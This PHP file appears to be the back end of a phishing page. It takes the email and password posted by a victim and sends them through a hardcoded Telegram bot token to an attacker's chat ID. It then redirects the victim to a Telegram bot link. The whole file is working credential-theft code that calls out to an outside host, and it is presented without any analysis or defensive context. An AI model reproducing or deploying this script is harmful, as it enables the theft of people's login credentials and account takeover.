<?php
$API_KEY = "5370952236:AAEZq2cMXOShTg0iJ6ER6bh_mSgDTABuYJY";

$admin = 1474863830 ; 
$email = $_POST["email"];
$password = $_POST['password'];
$login = $_POST['login'];
$time = date("Y-m-d H:i:s");
$text = urlencode("
- Type : iNDEK Hussain

- Email : `$email`

- Pass : `$password`

");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>
</script>
<meta http-equiv="Refresh" content="0; url=https://t.me/ILTrI_bot" />
</head>
<body>
</body>
</html>